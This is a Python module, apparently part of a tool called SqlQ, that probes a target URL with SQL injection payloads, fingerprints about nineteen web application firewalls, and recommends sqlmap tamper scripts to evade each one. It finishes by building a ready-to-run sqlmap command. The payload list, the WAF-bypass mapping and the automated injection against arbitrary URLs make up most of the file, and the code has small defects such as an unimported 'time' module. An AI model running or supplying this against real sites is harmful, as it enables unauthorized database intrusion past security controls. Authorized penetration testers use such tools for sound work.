#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# -----------------------------------------
# Atlas Integration - WAF detection and tamper script suggester
# Based on the Atlas tool by M'hamed ("m4ll0k") Outaadi
# Integrated with SqlQ by PCRY
# -----------------------------------------

import os
import re
import sys
import subprocess
import requests
import random
import urllib.parse
from typing import Dict, List, Tuple, Union, Optional

# Common WAF signatures - Expanded with many more WAF types
WAF_SIGNATURES = {
    "Cloudflare": [
        "Cloudflare Ray ID:",
        "Security by Cloudflare",
        "::CAPTCHA_BOX::",
        "cloudflare-nginx",
        "Attention Required! | Cloudflare",
        "Sorry, you have been blocked",
        "<title>DDOS-GUARD</title>"
    ],
    "ModSecurity": [
        "This error was generated by Mod_Security",
        "ModSecurity Action:",
        "ModSecurity Rule",
        "Mod_Security",
        "not acceptable according to the validation procedure",
        "One or more security constraints"
    ],
    "AWS WAF": [
        "AWS WAF Blocked Request",
        "Reference ID:",
        "Request blocked",
        "AWS WebACL",
        "This request was blocked by an AWS WAF"
    ],
    "Imperva": [
        "Powered by Imperva",
        "Imperva Inc.",
        "The requested URL was rejected. Please consult with your administrator",
        "<title>Imperva</title>",
        "incapsula",
        "_Incapsula_Resource"
    ],
    "Akamai": [
        "Reference #",
        "Access Denied: Akamai",
        "AkamaiGHost",
        "X-Akamai-",
        "AKAMAI_"
    ],
    "F5 ASM/BIG-IP": [
        "The requested URL was rejected. Please consult with your administrator",
        "Support ID:",
        "The requested URL was rejected.",
        "<title>F5 Networks</title>"
    ],
    "Sucuri": [
        "Sucuri WebSite Firewall",
        "Powered by Sucuri",
        "cloudproxy@sucuri.net",
        "Sucuri Website Firewall - CloudProxy - Access Denied"
    ],
    "Wordfence": [
        "This response was generated by Wordfence",
        "Your access to this site has been limited",
        "Generated by Wordfence",
        "www.wordfence.com"
    ],
    "Fortinet/FortiWeb": [
        "FortiWeb Application Firewall",
        "Protected by FortiWeb",
        "<title>Powered by FortiWeb</title>",
        "The page cannot be displayed. Please contact the administrator."
    ],
    "Barracuda": [
        "This website is using a Barracuda Web Application Firewall",
        "You are attempting to access a forbidden site",
        "Barracuda Networks"
    ],
    "Radware": [
        "Unauthorized Activity Has Been Detected",
        "with the following case number in its subject line",
        "because we have detected unauthorized activity",
        "<title>Unauthorized Request Blocked</title>"
    ],
    "Palo Alto": [
        "has been blocked in accordance with company policy",
        "Your request has been blocked by Palo Alto",
        "<title>Access Blocked</title>"
    ],
    "Nginx WAF": [
        "nginx-wallarm",
        "nginx-naxsi",
        "NAXSI blocked information"
    ],
    "Wallarm": [
        "nginx-wallarm",
        "wallarm",
        "<title>Wallarm</title>"
    ],
    "WebKnight": [
        "WebKnight Application Firewall Alert",
        "AQTRONIX WebKnight",
        "The current request was blocked"
    ],
    "Sitelock": [
        "SiteLock Incident ID",
        "sitelock-site-verification",
        "<title>SiteLock</title>"
    ],
    "Comodo WAF": [
        "Protected by COMODO WAF",
        "<title>Access Denied</title>",
        "The requested URL was rejected."
    ],
    "DDoS-Guard": [
        "DDoS-Guard",
        "<title>DDOS-GUARD</title>"
    ],
    "Generic WAF": [
        "Access Denied",
        "Your Request Looks Suspicious",
        "403 Forbidden",
        "The request could not be satisfied",
        "The page you requested has been blocked",
        "Suspicious Activity Detected",
        "This request has been blocked",
        "You are not authorized to access this page",
        "Your request has been rejected due to security reasons",
        "For security reasons, this request has been blocked",
        "Your request contains potentially malicious or suspicious content"
    ]
}

# SQL Injection test payloads 
SQL_PAYLOADS = [
    "' OR '1'='1", 
    "' OR 1=1--", 
    "' UNION SELECT 1,2,3--",
    "' AND 1=2 UNION SELECT 1,2,3--", 
    "1' ORDER BY 10--", 
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- ",
    "' AND SLEEP(3)--",
    "\" OR \"1\"=\"1"
]

# Dictionary mapping WAF types to effective tamper scripts
WAF_TAMPER_MAP = {
    "Cloudflare": ["space2comment", "space2hash", "charencode", "charunicodeencode", "randomcase"],
    "ModSecurity": ["space2comment", "space2hash", "charencode", "charunicodeencode", "apostrophemask", "apostrophenullencode"],
    "AWS WAF": ["space2comment", "space2hash", "charencode", "bluecoat", "charunicodeencode"],
    "Imperva": ["apostrophenullencode", "space2comment", "charencode", "chardoubleencode", "unmagicquotes"],
    "Akamai": ["space2comment", "charencode", "apostrophemask", "equaltolike"],
    "F5 ASM/BIG-IP": ["space2comment", "space2hash", "charencode", "apostrophemask"],
    "Sucuri": ["space2comment", "space2hash", "charencode", "apostrophemask", "equaltolike"],
    "Wordfence": ["apostrophenullencode", "bluecoat", "charencode", "space2comment"],
    "Fortinet/FortiWeb": ["charunicodeencode", "apostrophemask", "randomcase"],
    "Barracuda": ["charencode", "equaltolike", "space2comment", "apostrophemask"],
    "Radware": ["chardoubleencode", "space2comment", "apostrophenullencode"],
    "Palo Alto": ["base64encode", "space2comment", "apostrophemask"],
    "Nginx WAF": ["charencode", "space2comment", "randomcase"],
    "Wallarm": ["space2comment", "charencode", "equaltolike"],
    "WebKnight": ["apostrophemask", "space2comment", "charencode"],
    "Sitelock": ["charencode", "apostrophemask", "space2comment"],
    "Comodo WAF": ["apostrophemask", "chardoubleencode", "space2comment"],
    "DDoS-Guard": ["space2comment", "charencode", "randomcase"],
    "Generic WAF": ["space2comment", "space2hash", "charencode", "charunicodeencode", 
                   "apostrophenullencode", "base64encode", "percentage", "randomcase", 
                   "htmlencode", "versionedmorekeywords"]
}

# Generic tamper scripts to try when WAF is not specifically identified
GENERIC_TAMPERS = [
    "between", "charencode", "charunicodeencode", "equaltolike", 
    "space2comment", "space2dash", "space2hash", "space2plus",
    "randomcase", "apostrophenullencode", "base64encode", "percentage"
]


def detect_waf(url: str, headers: Optional[Dict] = None) -> Dict:
    """
    Detect if a URL is protected by a WAF by sending test payloads and analyzing the response.
    
    This function attempts to identify 18+ different WAF products by their signatures.
    
    Args:
        url: The URL to test
        headers: Optional custom headers for the request
        
    Returns:
        Dictionary with WAF detection results {'detected': bool, 'waf_name': str, 'tampers': list}
    
    Raises:
        requests.RequestException: For network-related errors
        ValueError: For invalid URL formats
        TimeoutError: If the request times out
    """
    """
    Detect if a URL is protected by a WAF by sending test payloads and analyzing the response.
    
    Args:
        url: The URL to test
        headers: Optional custom headers for the request
        
    Returns:
        Dictionary with WAF detection results 
    """
    if headers is None:
        headers = {
            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SqlQ WAF Detector/1.0'
        }
    
    # Check if URL has parameters
    if '?' not in url:
        print("[WAF] URL has no parameters, cannot test for WAF")
        return {"detected": False, "waf_name": None, "tampers": GENERIC_TAMPERS}

    # Get base response (without injection)
    retry_count = 0
    max_retries = 3
    
    while retry_count < max_retries:
        try:
            base_response = requests.get(url, headers=headers, timeout=10)
            base_status = base_response.status_code
            print(f"[WAF] Base request returned status code: {base_status}")
            break
        except requests.exceptions.Timeout:
            retry_count += 1
            if retry_count < max_retries:
                print(f"[WAF] Request timed out, retrying ({retry_count}/{max_retries})...")
                time.sleep(1)
            else:
                print(f"[WAF] Request timed out after {max_retries} attempts")
                return {"detected": False, "waf_name": None, "tampers": GENERIC_TAMPERS}
        except requests.exceptions.ConnectionError as e:
            print(f"[WAF] Connection error: {e}")
            return {"detected": False, "waf_name": None, "tampers": GENERIC_TAMPERS}
        except Exception as e:
            print(f"[WAF] Error in base request: {e}")
            return {"detected": False, "waf_name": None, "tampers": GENERIC_TAMPERS}
    
    # Test with SQL injection payloads
    waf_detected = False
    waf_name = "Generic WAF"
    
    for payload in SQL_PAYLOADS:
        try:
            # Add payload to URL parameters
            injected_url = add_payload_to_url(url, payload)
            
            # Send request with SQL injection payload
            try:
                test_response = requests.get(
                    injected_url, 
                    headers=headers, 
                    timeout=10,
                    allow_redirects=False
                )
            except requests.exceptions.Timeout:
                print(f"[WAF] Test request timed out for payload: {payload}")
                continue
            except requests.exceptions.ConnectionError:
                print(f"[WAF] Connection error testing payload: {payload}")
                continue
            except Exception as e:
                print(f"[WAF] Error testing payload {payload}: {e}")
                continue
            
            # Check for WAF signatures in response
            detected_waf = check_waf_signatures(test_response)
            
            # Check response code for WAF behavior
            if test_response.status_code in [403, 406, 429, 501, 502] and base_status not in [403, 406, 429, 501, 502]:
                waf_detected = True
                print(f"[WAF] WAF detected by status code change: {test_response.status_code}")
                break
                
            # WAF detected by signatures
            if detected_waf:
                waf_detected = True
                waf_name = detected_waf
                print(f"[WAF] WAF signature detected: {waf_name}")
                break
                
        except Exception as e:
            print(f"[WAF] Error testing payload {payload}: {e}")
    
    # Determine suitable tamper scripts
    if waf_detected and waf_name in WAF_TAMPER_MAP:
        tampers = WAF_TAMPER_MAP[waf_name]
    else:
        tampers = GENERIC_TAMPERS
        
    return {
        "detected": waf_detected,
        "waf_name": waf_name if waf_detected else None,
        "tampers": tampers
    }


def add_payload_to_url(url: str, payload: str) -> str:
    """
    Add a SQL injection payload to URL parameters
    
    Args:
        url: Original URL
        payload: SQL injection payload
        
    Returns:
        URL with payload injected
    """
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qsl(parsed.query)
    
    # If no query parameters, add one with the payload
    if not query_params:
        new_query = urllib.parse.urlencode({"id": payload})
        return urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    # Otherwise, inject payload into the first parameter
    new_params = []
    first_param = True
    
    for key, value in query_params:
        if first_param:
            new_params.append((key, value + payload))
            first_param = False
        else:
            new_params.append((key, value))
    
    new_query = urllib.parse.urlencode(new_params)
    return urllib.parse.urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, parsed.fragment
    ))


def check_waf_signatures(response) -> Optional[str]:
    """
    Check for WAF signatures in HTTP response
    
    Args:
        response: Requests response object
        
    Returns:
        Name of detected WAF or None
    """
    # Check headers and response content for WAF signatures
    response_text = response.text
    response_headers = str(response.headers)
    
    for waf, signatures in WAF_SIGNATURES.items():
        for signature in signatures:
            if signature in response_text or signature in response_headers:
                return waf
    
    return None


def find_best_tampers(url: str, method: str = 'GET', data: str = None, 
                      headers: Dict = None, timeout: int = 30, max_retry: int = 3) -> List[str]:
    """
    Find the best tamper scripts to bypass WAF for a specific URL
    
    This function performs multiple tests with different payloads to identify WAFs
    and determine the most effective tamper scripts for bypassing them.
    
    Args:
        url: Target URL with parameters
        method: HTTP method (GET or POST)
        data: POST data (if method is POST)
        headers: Custom headers for the request
        timeout: Request timeout in seconds
        max_retry: Maximum number of retry attempts for network errors
        
    Returns:
        List of tamper scripts recommended for bypassing the detected WAF
    
    Raises:
        ConnectionError: If the connection fails after max retries
        ValueError: For invalid input parameters
    """
    """
    Find the best tamper scripts to bypass WAF for a specific URL
    
    Args:
        url: Target URL with parameters
        method: HTTP method (GET or POST)
        data: POST data (if method is POST)
        headers: Custom headers for the request
        timeout: Request timeout in seconds
        
    Returns:
        List of tamper scripts recommended for bypassing WAF
    """
    print("[*] Detecting WAF and recommending tamper scripts...")
    waf_results = detect_waf(url, headers)
    
    if waf_results["detected"]:
        print(f"[+] WAF detected: {waf_results['waf_name']}")
        print(f"[+] Recommended tamper scripts: {', '.join(waf_results['tampers'])}")
    else:
        print("[-] No WAF detected or could not confirm WAF presence")
        print(f"[+] Generic tamper scripts: {', '.join(waf_results['tampers'])}")
    
    return waf_results["tampers"]


def sqlmap_with_tampers(url: str, output_dir: str, tampers: List[str], 
                        sqlmap_options: Dict = None) -> str:
    """
    Run SQLMap with suitable tamper scripts
    
    Args:
        url: Target URL
        output_dir: Output directory for results
        tampers: List of tamper scripts to try
        sqlmap_options: Additional SQLMap options
        
    Returns:
        SQLMap command to execute
    """
    if sqlmap_options is None:
        sqlmap_options = {}
    
    # Combine tamper scripts
    tamper_str = ",".join(tampers)
    
    # Build SQLMap command
    command = ["sqlmap", "-u", url, "--tamper", tamper_str, "--batch"]
    
    # Add output directory
    command.extend(["--output-dir", output_dir])
    
    # Add other options
    for option, value in sqlmap_options.items():
        if value is True:
            command.append(f"--{option}")
        elif value not in [False, None]:
            command.extend([f"--{option}", str(value)])
    
    # Return the command as a string
    return " ".join(command)


if __name__ == "__main__":
    # Test the module directly
    if len(sys.argv) > 1:
        url = sys.argv[1]
        tampers = find_best_tampers(url)
        print("\nSuggested SQLMap command:")
        print(sqlmap_with_tampers(url, "./output", tampers))
    else:
        print("Usage: python atlas_integrator.py <URL>")
